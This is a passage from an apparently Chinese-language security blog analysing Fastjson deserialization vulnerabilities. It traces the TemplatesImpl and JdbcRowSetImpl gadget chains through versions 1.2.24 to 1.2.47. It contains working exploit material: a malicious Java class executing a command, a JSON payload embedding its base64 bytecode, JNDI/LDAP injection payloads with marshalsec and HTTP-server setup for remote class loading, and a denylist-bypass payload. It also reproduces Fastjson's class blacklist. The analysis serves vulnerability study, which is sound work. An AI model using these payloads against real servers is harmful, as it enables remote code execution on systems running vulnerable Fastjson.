title=\"image-20240617203054954\"></p>\n<p>如果 <code>_class</code>  中 <code>_transletIndex</code>  的类可控的话，就能够进行利用了，继续查找赋值的地方</p>\n<p>在 <code>defineTransletClasses()</code>  方法中对其进行了赋值的操作，为了成功执行到该处，要保证 <code>_bytecodes</code>  的值不为空，该变量是成员属性，可以控制，到了下面就会将 <code>_bytecodes</code>  中的类加载并传入 <code>_class</code>  中索引为 <code>i</code>  的位置，当该类的父类为 <code>ABSTRACT_TRANSLET</code>  时， <code>_transletIndex</code>  的值就为 <code>i</code>  的值，所以到目前位置，可以利用必要条件都能满足</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617204431811.png\" class title=\"image-20240617204431811\"></p>\n<p>而在 <code>getTransletInstance()</code>  方法中，只要成员属性 <code>_class</code>  的值为 null 即可执行 <code>defineTransletClasses()</code>  方法，这里也是可控的。接下来要寻找调用 <code>getTransletInstance()</code>  方法的地方</p>\n<p>在下面的 <code>newTransformer()</code>  方法中调用了 <code>getTransletInstance()</code>  方法</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617205702806.png\" class title=\"image-20240617205702806\"></p>\n<p>继续寻找调用链，在下面的 <code>getOutputProperties()</code>  方法中调用了 <code>newTransformer()</code>  方法</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617205848456.png\" class title=\"image-20240617205848456\"></p>\n<p>而 <code>getOutputProperties()</code>  方法是成员属性 <code>_outputProperties</code>  的 <code>getter</code>  方法</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617210331578.png\" class title=\"image-20240617210331578\"></p>\n<p>此时不知道具体运行途中是否会调用 <code>getOutputProperties()</code>  方法，打上断点进行调试看看</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617212312321.png\" class title=\"image-20240617212312321\"></p>\n<p>调试到给 token 赋值之后继续跟进</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617221513701.png\" class title=\"image-20240617221513701\"></p>\n<p>跟进 <code>getDeserializer()</code>  方法</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617221622655.png\" class title=\"image-20240617221622655\"></p>\n<p>继续跟进 <code>createJavaBeanDeserializer()</code>  方法</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617221708298.png\" class title=\"image-20240617221708298\"></p>\n<p>再跟进 <code>JavaBeanInfo.build()</code>  方法</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617221834456.png\" class title=\"image-20240617221834456\"></p>\n<p>跟进来后发现会获取到类中全部的方法</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617222133511.png\" class title=\"image-20240617222133511\"></p>\n<p>运行到此处会将方法逐一取出并进行诸多条件的判断，此时正在进行对 <code>getOutputProperties()</code>  方法的判断</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617222356625.png\" class title=\"image-20240617222356625\"></p>\n<p>继续运行发现满足条件并且会将与该方法相关的一些信息加入到 <code>fieldList</code>  中</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617223025805.png\" class title=\"image-20240617223025805\"></p>\n<p>再往后调试发现的确运行了我们构造的恶意类中的命令</p>\n<p>因此该漏洞的完整调用链为：</p>\n<p><code>getOutputProperties() -&gt; newTransformer() -&gt; getTransletInstance() -&gt; defineTransletClasses() -&gt; EvilClass.newInstance()</code></p>\n<p>为了保证程序中途不报异常，还需保证 <code>_outputProperties</code> 、 <code>_indentNumber</code> 、 <code>_tfactory</code>  的值不为 null</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617232124666.png\" class title=\"image-20240617232124666\"></p>\n<p>而 <code>_indentNumber</code>  的值默认为 0，可以不用设置</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617232309487.png\" class title=\"image-20240617232309487\"></p>\n<p>而 <code>_outputProperties</code> 、 <code>_tfactory</code>  的值在不设置时是为 null，因此需要在 payload 中加上</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617232413238.png\" class title=\"image-20240617232413238\"></p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617232438395.png\" class title=\"image-20240617232438395\"></p>\n<p>并且 payload 中更改的私有变量部分没有 <code>setter</code>  方法，因此在进行反序列化时需要设置</p>\n<p><code>Feature.SupportNonPublicField</code>  参数</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617232746279.png\" class title=\"image-20240617232746279\"></p>\n<h5 id=\"恶意类字节码构造\"><a class=\"anchor\" href=\"#恶意类字节码构造\">#</a> 恶意类字节码构造</h5>\n<p>编写一个恶意类<mark> Evil.java</mark>:</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>example<span class=\"token punctuation\">.</span>fastjsondemo</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">DOM</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">TransletException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xalan<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>xsltc<span class=\"token punctuation\">.</span>runtime<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AbstractTranslet</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xml<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>dtm<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">DTMAxisIterator</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>sun<span class=\"token punctuation\">.</span>org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>xml<span class=\"token punctuation\">.</span>internal<span class=\"token punctuation\">.</span>serializer<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">SerializationHandler</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Evil</span> <span class=\"token keyword\">extends</span> <span class=\"token class-name\">AbstractTranslet</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Evil</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"calc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DOM</span> document<span class=\"token punctuation\">,</span> <span class=\"token class-name\">SerializationHandler</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> handlers<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">TransletException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">transform</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DOM</span> document<span class=\"token punctuation\">,</span> <span class=\"token class-name\">DTMAxisIterator</span> iterator<span class=\"token punctuation\">,</span> <span class=\"token class-name\">SerializationHandler</span> handler<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">TransletException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token class-name\">Evil</span> e <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Evil</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>使用 <code>javac Evil.java</code>  编译成.class 文件</p>\n<p>使用如下 python 脚本输出对应的类字节 base64 编码：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">r\"Evil.class\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    classbyte <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>classbyte<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>因此最终的 payload 为：</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token property\">\"_bytecodes\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhDAAIAAkHACEMACIAIwEABGNhbGMMACQAJQEAHWNvbS9leGFtcGxlL2Zhc3Rqc29uZGVtby9FdmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACwAAAA4AAwAAAAwABAANAA0ADgAMAAAABAABAA0AAQAOAA8AAgAKAAAAGQAAAAMAAAABsQAAAAEACwAAAAYAAQAAABIADAAAAAQAAQAQAAEADgARAAIACgAAABkAAAAEAAAAAbEAAAABAAsAAAAGAAEAAAAWAAwAAAAEAAEAEAAJABIAEwACAAoAAAAlAAIAAgAAAAm7AAVZtwAGTLEAAAABAAsAAAAKAAIAAAAYAAgAGQAMAAAABAABABQAAQAVAAAAAgAW\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token property\">\"_name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"h40vv3n\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token property\">\"_tfactory\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token property\">\"_outputProperties\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"jdbcrowsetimpl反序列化\"><a class=\"anchor\" href=\"#jdbcrowsetimpl反序列化\">#</a> JdbcRowSetImpl 反序列化</h4>\n<p>JdbcRowSetImpl 类位于 <code>com.sun.rowset.JdbcRowSetImpl</code> ，这条漏洞利用链</p>\n<p>是  <code>javax.naming.InitialContext.lookup()</code>  参数可控导致的 JNDI 注入</p>\n<p>进入到相关文件查看漏洞点，只要 <code>this.conn</code>  为空则会调用 <code>lookup()</code>  方法，参数为方法 <code>this.getDataSourceName()</code>  的返回值，而该方法正是成员属性 <code>dataSourceName</code>  的 getter 方法，因此可控</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240618102841321.png\" class title=\"image-20240618102841321\"></p>\n<p>查找调用 <code>connect()</code>  方法的函数，找到了 <code>setAutoCommit()</code>  方法，该方法是成员属性 <code>autoCommit</code>  的 setter 方法，因此 payload 中设置 <code>autoCommit</code>  的值即可触发该方法</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240618103317593.png\" class title=\"image-20240618103317593\"></p>\n<p>因此最终的 payload 为：</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"com.sun.rowset.JdbcRowSetImpl\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token property\">\"dataSourceName\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"ldap://localhost:1389/Exploit\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token property\">\"autoCommit\"</span><span class=\"token operator\">:</span><span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h5 id=\"使用marshalsec构建ldap服务\"><a class=\"anchor\" href=\"#使用marshalsec构建ldap服务\">#</a> 使用 marshalsec 构建 ldap 服务</h5>\n<p>将相关文件 git 下来：</p>\n<p><code>git clone git@github.com:mbechler/marshalsec.git</code></p>\n<p>mvn 编译成 jar 包：</p>\n<p><code>mvn clean package -DskipTests</code></p>\n<p>最后在 target 目录下会生成<mark> marshalsec-0.0.3-SNAPSHOT-all.jar</mark></p>\n<p>启动命令：</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">java</span> <span class=\"token parameter variable\">-cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/<span class=\"token comment\">#Exploit</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240618104301245.png\" class title=\"image-20240618104301245\"></p>\n<p>在相同的目录下编写恶意类并编译成.class 文件：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Exploit</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token class-name\">Exploit</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">try</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token class-name\">Runtime</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRuntime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"calc\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span>  <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> argv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">Exploit</span> e <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Exploit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>在相同目录下执行以下命令开启一个简易的 web 服务：</p>\n<p><code>python -m SimpleHTTPServer 8081</code></p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240618104625817.png\" class title=\"image-20240618104625817\"></p>\n<p>最后通过 postman 将 payload 打过去即可加载远程类，执行类中代码</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240618104942541.png\" class title=\"image-20240618104942541\"></p>\n<h3 id=\"fastjson-1225\"><a class=\"anchor\" href=\"#fastjson-1225\">#</a> Fastjson-1.2.25</h3>\n<p>在版本 1.2.25 中，官方对之前的反序列化漏洞进行了修复，引入了 checkAutoType 安全机制，默认情况下 autoTypeSupport 关闭，不能直接反序列化任意类，而打开 AutoType 之后，是基于内置黑名单来实现安全的，fastjson 也提供了添加黑名单的接口。</p>\n<blockquote>\n<p>影响版本： <code>1.2.25 &lt;= fastjson &lt;= 1.2.41</code>  描述：作者通过为危险功能添加开关，并提供黑白名单两种方式进行安全防护，其实已经是相当完整的防护思路，而且作者已经意识到黑名单类将会无穷无尽，仅仅通过维护列表来防止反序列化漏洞并非最好的办法。而且靠用户自己来关注安全信息去维护也不现实。</p>\n</blockquote>\n<p>该版本的安全更新主要集中在 <code>com.alibaba.fastjson.parser.ParserConfig.java</code>  文件中，使用 idea 反编译查看对应的.class 文件，新出现了几个成员变量：布尔类型的 <code>autoTypeSupport</code> ，用来指定是否开启任意类的反序列化，默认关闭；字符串数组 <code>denyList</code> ，存放着黑名单类；字符串数组 <code>acceptList</code> ，存放白名单类</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240618203400528.png\" class title=\"image-20240618203400528\"></p>\n<p>黑名单 <code>denylist</code>  包含：</p>\n<pre><code>bsh\ncom.mchange\ncom.sun.\njava.lang.Thread\njava.net.Socket\njava.rmi\njavax.xml\norg.apache.bcel\norg.apache.commons.beanutils\norg.apache.commons.collections.Transformer\norg.apache.commons.collections.functors\norg.apache.commons.collections4.comparators\norg.apache.commons.fileupload\norg.apache.myfaces.context.servlet\norg.apache.tomcat\norg.apache.wicket.util\norg.codehaus.groovy.runtime\norg.hibernate\norg.jboss\norg.mozilla.javascript\norg.python.core\norg.springframework\n</code></pre>\n<p>添加白名单有三种方法：</p>\n<p>1、使用代码： <code>ParserConfig.getGlobalInstance().addAccept(“org.javaweb.”)</code></p>\n<p>2、加上 JVM 启动参数： <code>-Dfastjson.parser.autoTypeAccept=org.javaweb.</code></p>\n<p>3、在 fastjson.properties 中添加： <code>fastjson.parser.autoTypeAccept=org.javaweb.</code></p>\n<h4 id=\"漏洞分析-2\"><a class=\"anchor\" href=\"#漏洞分析-2\">#</a> 漏洞分析</h4>\n<p>往下定位到 <code>checkAutoType()</code>  方法处，如果开启了 <code>autoTypeSupport</code> ，则先匹配白名单，若匹配到就直接使用 <code>TypeUtils.loadClass()</code>  进行加载，然后在进行黑名单匹配，匹配到就直接抛出异常</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240618204838396.png\" class title=\"image-20240618204838396\"></p>\n<p>如果没开启 <code>autoTypeSupport</code> ，就先使用黑名单匹配，匹配到了抛出异常。然后再用白名单匹配加载</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240618211854792.png\" class title=\"image-20240618211854792\"></p>\n<p>若是黑白名单都没有匹配到的话，只有开启 <code>autoTypeSupport</code>  且指定了 Class 对象才会加载</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240618212416787.png\" class title=\"image-20240618212416787\"></p>\n<p>继续跟进 <code>loadClass()</code>  方法，这其中会对类名进行一些预处理，通过递归去除开头的 <code>[</code> 、 <code>L</code>  以及结尾的 <code>;</code></p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240618213114272.png\" class title=\"image-20240618213114272\"></p>\n<p>然而因为这样的处理就会导致逻辑漏洞，攻击者可恶意构造包含这些字符的类从而能够绕过前面黑名单的过滤，在具体加载前，这些特殊符号又会被去掉，从而又能导致任意类加载。</p>\n<p>所以最终的 payload 之一可以如下：</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"Lcom.sun.rowset.JdbcRowSetImpl;\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token property\">\"dataSourceName\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"ldap://localhost:1389/Exploit\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token property\">\"autoCommit\"</span><span class=\"token operator\">:</span><span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>不过该版本默认关闭了 <code>autoTypeSupport</code> ，所以在反序列化之前需要先开启:</p>\n<p><code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true)</code></p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240618214258659.png\" class title=\"image-20240618214258659\"></p>\n<p>然后将 payload 打过去即可触发恶意类的代码</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240618222803771.png\" class title=\"image-20240618222803771\"></p>\n<h3 id=\"fastjson-1247\"><a class=\"anchor\" href=\"#fastjson-1247\">#</a> Fastjson-1.2.47</h3>\n<p>在 fastjson 不断迭代到 1.2.47 时，爆出了最为严重的漏洞，可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。</p>\n<blockquote>\n<p>影响版本： <code>1.2.25 &lt;= fastjson &lt;= 1.2.32 未开启 AutoTypeSupport</code>  影响版本： <code>1.2.33 &lt;= fastjson &lt;= 1.2.47</code>  描述：作者删除了一个 fastjson 的测试文件： <code>https://github.com/alibaba/fastjson/commit/be41b36a8d748067ba4debf12bf236388e500c66</code>  ，里面包含了这次通杀漏洞的 payload。</p>\n</blockquote>\n<p>该漏洞的点位于 <code>checkAutoType()</code>  中</p>\n<p>首先还是先判断是否开启 <code>autoTypeSupport</code> ，若开启，则先匹配白名单，若没匹配到再匹配黑名单，此时只有黑名匹配到且同时没有从 <code>mappings</code>  中取到对应的 class 才会抛出异常</p>\n<p><img loading=\"lazy\" 